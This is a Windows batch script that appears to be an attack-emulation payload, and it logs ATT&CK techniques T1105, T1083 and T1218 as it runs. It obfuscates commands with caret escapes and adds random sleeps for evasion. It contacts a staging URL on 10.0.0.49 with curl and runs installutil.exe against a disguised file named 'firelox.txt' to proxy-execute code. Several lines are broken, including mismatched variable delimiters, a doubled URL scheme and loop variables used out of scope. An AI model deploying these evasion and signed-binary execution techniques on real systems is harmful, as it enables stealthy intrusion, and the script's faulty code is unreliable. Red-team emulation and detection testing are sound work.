@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NO escapes)
SET txisnba=%APPDATA%\7634\30ac0299
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7634-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=firelox.txt
SET dvhhyc=7634

REM Initial random delay
SET /A yxmre=%RANDOM% %% 30 + 30
timeout /t !yxmre! /nobreak >nul

REM Build obfuscated strings with caret escapes
SET ghs=cu^r^l
SET jkl=-k^ -s^ -o^ nu^l
SET mnp=ht^tp:/^/
SET qrs=w^ww^.
SET tuv=.c^om
SET abc=in^st^al^lu^t
SET def=ex^e
SET ghi=logf^ile
SET jkm=LogToC^on^sole
SET nop=fal^se
SET qrt=/U^
SET uvw=/U^

REM Check server availability (first task)
SET result_ttp=0
SET err_detail=
%ghs% !jkl! !mnp!%keghkgto% || (
  SET result_ttp=0
  SET err_detail=connection_refused
)

REM Log TTP T1105 (Ingress Tool Transfer)
FOR /F "tokens=2-4 delims=/-" %%a IN ('echo %DATE%') DO SET year=%%c
FOR /F "tokens=1-3 delims=/:." %%a IN ('echo %TIME%') DO (
  SET hour=%%a
  SET min=%%b
  SET sec=%%c
  SET ms=%%d
)
IF "!hour:~0,1!"==" " SET hour=0!hour:~1!
IF "!ms!"=="" SET ms=000
(
  echo [!year!-%%a-%%b !hour!:!min!:!sec!.!ms!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1105^|Ingress Tool Transfer=!result_ttp!:!err_detail!
) >> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul

REM Medium delay after check
ping -n 12 127.0.0.1 >nul

REM Change to output directory
cd /d "!txisnba!" >nul 2>&1
IF ERRORLEVEL 1 (
  SET result_ttp2=0
  SET err_detail2=directory_not_found
) ELSE (
  SET result_ttp2=1
  SET err_detail2=
)

REM Log TTP T1083 (File and Directory Discovery)
FOR /F "tokens=2-4 delims=/-" %%a IN ('echo %DATE%') DO SET year2=%%c
FOR /F "tokens=1-3 delims=/:." %%a IN ('echo %TIME%') DO (
  SET hour2=%%a
  SET min2=%%b
  SET sec2=%%c
  SET ms2=%%d
)
IF "!hour2:~0,1!"==" " SET hour2=0!hour2:~1!
IF "!ms2!"=="" SET ms2=000
(
  echo [!year2!-%%a-%%b !hour2!:!min2!:!sec2!.!ms2!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1083^|File and Directory Discovery=!result_ttp2!:!err_detail2!
) >> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul

CHOICE /C Y /N /D Y /T 8 >nul

REM Execute DLL with installutil (T1218)
SET cmd1=!abc!!def!
SET cmd2= !ghi!= !jkm!=!nop!
SET cmd3= !uvw! "!xzanpex!"
%cmd1!%cmd2!%cmd3%

IF ERRORLEVEL 1 (
  SET result_ttp3=0
  SET err_detail3=assembly_load_failed
) ELSE (
  SET result_ttp3=1
  SET err_detail3=
)

REM Final delay before logging
SET /A zxcvb=%RANDOM% %% 10 + 5
timeout /t !zxcvb! /nobreak >nul

REM Log TTP T1218 (Signed Binary Proxy Execution)
FOR /F "tokens=2-4 delims=/-" %%a IN ('echo %DATE%') DO SET year3=%%c
FOR /F "tokens=1-3 delims=/:." %%a IN ('echo %TIME%') DO (
  SET hour3=%%a
  SET min3=%%b
  SET sec3=%%c
  SET ms3=%%d
)
IF "!hour3:~0,1!"==" " SET hour3=0!hour3:~1!
IF "!ms3!"=="" SET ms3=000
(
  echo [!year3!-%%a-%%b !hour3!:!min3!:!sec3!.!ms3!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218^|Signed Binary Proxy Execution=!result_ttp3!:!err_detail3!
) >> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul

ENDLOCAL